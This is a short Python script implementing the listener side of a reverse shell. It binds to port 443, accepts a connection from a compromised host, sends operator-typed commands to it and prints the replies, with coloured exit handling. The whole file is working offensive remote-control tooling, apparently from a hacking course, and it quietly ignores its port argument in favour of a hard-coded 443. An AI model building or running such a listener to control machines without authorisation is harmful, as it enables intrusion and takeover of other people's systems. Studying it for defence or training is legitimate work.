import socket
import signal
import sys
from termcolor import colored

def def_handler(sig, frame):
    print(colored(f"\n[!] Exiting...\n", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

class Listener:
    def __init__(self, ip, port):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((ip, 443))
        server_socket.listen()

        print(f"\n[+] Listening on {ip}:{443}")
        self.client_socket, client_address = server_socket.accept()
        print(f"\n[+] Connection established by {client_address}\n")

    def run(self):
        while True:
            command = input(">> ")
            self.client_socket.send(command.encode())
            command_output = self.client_socket.recv(1024).decode()
            print(command_output)

if __name__ == '__main__':
    ip = ''
    port = 443
    my_listener = Listener(ip, port)
    my_listener.run()